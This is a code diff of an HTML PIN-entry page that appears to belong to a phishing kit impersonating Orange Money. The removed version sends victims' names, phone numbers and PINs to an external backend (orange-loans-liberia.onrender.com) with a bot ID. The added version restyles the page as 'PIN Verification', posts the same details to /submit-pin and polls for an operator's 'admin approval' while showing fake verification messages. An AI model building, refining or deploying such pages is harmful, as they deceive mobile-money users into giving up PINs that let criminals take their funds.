@@ -1,168 +1,385 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
-
-<style>
-body {
-    font-family: Arial, sans-serif;
-    background: #000; /* black background */
-    height: 100vh;
-    margin: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.pin-container {
-    width: 100%;
-    max-width: 420px;
-    padding: 20px;
-    text-align: center;
-}
-
-.logo {
-    margin-bottom: 25px;
-    color: #fff;
-}
-
-.logo h1 {
-    margin: 0;
-    font-size: 32px;
-}
-
-input {
-    width: 100%;
-    padding: 14px;
-    border-radius: 25px;
-    border: none;
-    outline: none;
-    margin-bottom: 15px;
-    font-size: 16px;
-    background: rgba(255,255,255,0.05);
-    color: #fff;
-}
-
-input::placeholder {
-    color: rgba(255,165,0,0.7);
-}
-
-button {
-    width: 100%;
-    padding: 14px;
-    border-radius: 25px;
-    border: none;
-    background: orange;
-    color: #000;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-button:hover {
-    background: #ff9c00;
-}
-
-button:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-}
-
-.status {
-    margin-top: 12px;
-    font-size: 14px;
-    color: #fff;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+            font-size: 14px;
+        }
+        .pin-container {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .pin-box {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 600;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            background: #fafafa;
+        }
+        .pin-box:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+            background: white;
+        }
+        .pin-box.filled {
+            border-color: #667eea;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+        .status.loading {
+            display: block;
+            background: #f0f0f0;
+            color: #333;
+        }
+        .status.success {
+            display: block;
+            background: #d4edda;
+            color: #155724;
+        }
+        .status.error {
+            display: block;
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #667eea;
+        }
+        .info-box .label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .info-box .value {
+            font-size: 15px;
+            color: #333;
+            margin-top: 2px;
+        }
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+            pointer-events: none;
+        }
+    </style>
 </head>
-
 <body>
+    <div class="container">
+        <h1>🔐 PIN Verification</h1>
+        <p class="subtitle">Enter your 4-digit PIN</p>
 
-<div class="pin-container">
+        <div class="info-box">
+            <div class="label">Name</div>
+            <div class="value" id="displayName">-</div>
+        </div>
+        <div class="info-box">
+            <div class="label">Phone</div>
+            <div class="value" id="displayPhone">-</div>
+        </div>
 
-    <div class="logo">
-        <h1>Orange money pin</h1>
+        <form id="pinForm">
+            <div class="form-group">
+                <label>Enter PIN</label>
+                <div class="pin-container">
+                    <input type="text" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
+                    <input type="text" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                </div>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">🔐 Verify PIN</button>
+        </form>
+
+        <div class="status" id="status"></div>
+        <a href="#" class="back-link" id="backLink">← Go Back</a>
     </div>
 
-    <form id="pinForm">
-        <input id="pinInput" type="password" placeholder="Enter PIN" maxlength="4" required>
-        <button id="submitBtn">LOGIN</button>
-    </form>
+    <script>
+        // Get data from URL params
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+        const phone = urlParams.get('phone');
+        const botId = urlParams.get('botId');
 
-    <div class="status" id="status"></div>
+        // Display name and phone
+        document.getElementById('displayName').textContent = name || 'Not provided';
+        document.getElementById('displayPhone').textContent = phone || 'Not provided';
 
-</div>
+        // Handle back link
+        const backLink = document.getElementById('backLink');
+        if (botId) {
+            backLink.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
+        }
 
-<script>
-const BACKEND_URL = "https://orange-loans-liberia.onrender.com";
+        const pinInputs = document.querySelectorAll('.pin-box');
+        const form = document.getElementById('pinForm');
+        const status = document.getElementById('status');
+        const submitBtn = document.getElementById('submitBtn');
 
-// ---------------- BOT ID ----------------
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId');
-if (!botId) {
-    alert("Invalid access link");
-    throw new Error("botId missing");
-}
+        // Auto-focus next input
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                // Only allow digits
+                this.value = this.value.replace(/\D/g, '');
+                
+                // Add filled class if value exists
+                if (this.value) {
+                    this.classList.add('filled');
+                } else {
+                    this.classList.remove('filled');
+                }
 
-// ---------------- SUBMIT PIN ----------------
-document.getElementById('pinForm').addEventListener('submit', async e => {
-    e.preventDefault();
+                // Move to next input if value is entered
+                if (this.value && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+            });
 
-    const pin = document.getElementById('pinInput').value.trim();
-    const phone = localStorage.getItem('phone'); // get phone from previous page
-    const name = localStorage.getItem('fullName'); // get name from previous page
-    const statusDiv = document.getElementById('status');
-    const btn = document.getElementById('submitBtn');
+            // Handle backspace
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    pinInputs[index - 1].focus();
+                    pinInputs[index - 1].value = '';
+                    pinInputs[index - 1].classList.remove('filled');
+                }
+            });
 
-    if (!phone || !name || pin.length < 4) return;
+            // Handle paste
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = paste.replace(/\D/g, '').slice(0, 4);
+                
+                pinInputs.forEach((pin, i) => {
+                    if (i < digits.length) {
+                        pin.value = digits[i] || '';
+                        if (pin.value) {
+                            pin.classList.add('filled');
+                        } else {
+                            pin.classList.remove('filled');
+                        }
+                    }
+                });
 
-    localStorage.setItem('pin', pin);
+                // Focus last filled or next empty
+                const nextEmpty = Array.from(pinInputs).find(p => !p.value);
+                if (nextEmpty) {
+                    nextEmpty.focus();
+                } else {
+                    pinInputs[3].focus();
+                }
+            });
 
-    btn.disabled = true;
-    btn.textContent = 'LOGIN'; // keep button text same, no extra message
-    statusDiv.textContent = ''; // do not show any message
-
-    try {
-        // send details to backend
-        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({ name, phone, pin, botId })
+            // Prevent non-numeric characters
+            input.addEventListener('keypress', function(e) {
+                if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Tab') {
+                    e.preventDefault();
+                }
+            });
         });
 
-        const { requestId } = await res.json();
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
 
-        // ---------------- POLLING ----------------
-        const poll = setInterval(async () => {
-            const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-            const d = await r.json();
+            // Get all PIN values
+            const pin = Array.from(pinInputs).map(input => input.value).join('');
 
-            if (d.approved === true) {
-                clearInterval(poll);
-                window.location.href = `success.html?botId=${botId}`;
+            if (pin.length !== 4) {
+                showStatus('Please enter all 4 digits of your PIN.', 'error');
+                // Shake animation for empty boxes
+                pinInputs.forEach(input => {
+                    if (!input.value) {
+                        input.style.borderColor = '#dc3545';
+                        setTimeout(() => {
+                            input.style.borderColor = '#e0e0e0';
+                        }, 1000);
+                    }
+                });
+                return;
             }
 
-            if (d.approved === false) {
-                clearInterval(poll);
-                statusDiv.textContent = "Incorrect PIN. Please try again.";
-                btn.disabled = false;
-                btn.textContent = 'LOGIN';
-                document.getElementById('pinInput').value = '';
+            if (!name || !phone || !botId) {
+                showStatus('Missing required information. Please go back and try again.', 'error');
+                return;
             }
 
-        }, 1500);
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.textContent = '⏳ Verifying...';
+            showStatus('Submitting PIN for verification...', 'loading');
 
-    } catch (err) {
-        statusDiv.textContent = "Network error, try again";
-        btn.disabled = false;
-        btn.textContent = 'LOGIN';
-    }
+            try {
+                const response = await fetch('/submit-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        name: name,
+                        phone: phone,
+                        pin: pin,
+                        botId: botId
+                    })
+                });
 
-});
-</script>
+                const data = await response.json();
 
+                if (!response.ok) {
+                    throw new Error(data.error || 'Failed to submit PIN');
+                }
+
+                showStatus('✅ PIN submitted for verification! Waiting for admin approval...', 'success');
+                
+                // Poll for approval
+                await pollForPinApproval(data.requestId, botId);
+
+            } catch (error) {
+                showStatus('❌ Error: ' + error.message, 'error');
+                submitBtn.disabled = false;
+                submitBtn.textContent = '🔐 Verify PIN';
+            }
+        });
+
+        async function pollForPinApproval(requestId, botId) {
+            const maxAttempts = 60; // 60 attempts * 3 seconds = 3 minutes
+            let attempts = 0;
+
+            const interval = setInterval(async () => {
+                attempts++;
+                
+                try {
+                    const response = await fetch(`/check-pin/${requestId}`);
+                    const data = await response.json();
+
+                    if (data.approved === true) {
+                        clearInterval(interval);
+                        showStatus('✅ PIN verified! Redirecting to success page...', 'success');
+                        setTimeout(() => {
+                            window.location.href = `/success.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
+                        }, 1500);
+                    } else if (data.approved === false) {
+                        clearInterval(interval);
+                        showStatus('❌ PIN verification rejected by admin. Please try again.', 'error');
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = '🔐 Verify PIN';
+                        // Clear PIN boxes
+                        pinInputs.forEach(input => {
+                            input.value = '';
+                            input.classList.remove('filled');
+                        });
+                        pinInputs[0].focus();
+                    } else if (attempts >= maxAttempts) {
+                        clearInterval(interval);
+                        showStatus('⏰ Verification timeout. Please try again or contact support.', 'error');
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = '🔐 Verify PIN';
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+            }, 3000); // Check every 3 seconds
+        }
+
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = 'status';
+            if (type) {
+                status.classList.add(type);
+            }
+        }
+    </script>
 </body>
 </html>
